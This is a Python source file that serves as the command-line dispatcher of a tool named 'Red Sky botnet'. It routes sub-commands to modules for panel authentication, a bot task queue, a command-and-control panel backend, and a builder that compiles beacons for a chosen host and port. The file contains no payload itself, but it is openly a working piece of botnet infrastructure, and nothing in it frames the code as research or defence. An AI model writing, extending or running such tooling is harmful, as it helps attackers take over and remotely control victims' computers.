# language: Python, file: Program/botnet/dispatch.py, target: Red Sky botnet router
import sys
from typing import List
from Program.utils import print_info, print_err

SUB = {
    "auth":    "auth",
    "tasks":   "tasker",
    "tasker":  "tasker",
    "panel":   "panel_backend",
    "backend": "panel_backend",
    "build":   "builder",
    "builder": "builder",
    "check":   "builder",
}


def _usage():
    print_info("redsky botnet <sub-command> [args...]")
    print_info("  auth <setup|reset|show>              panel password + TOTP")
    print_info("  tasks <queued|recent|stats|queue>    task queue")
    print_info("  panel serve [--host H] [--port N]    start panel backend")
    print_info("  build check                          toolchain status")
    print_info("  build build --host H [--port N]      compile a beacon")


def run_cli(args: List[str]) -> int:
    if not args:
        _usage()
        return 2
    sub = args[0].lower()
    if sub in ("-h", "--help"):
        _usage()
        return 0
    target = SUB.get(sub)
    if not target:
        print_err(f"unknown botnet sub-command: {sub}")
        _usage()
        return 2
    mod = __import__(f"Program.botnet.{target}", fromlist=["run_cli"])
    return int(mod.run_cli(args[1:]))


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
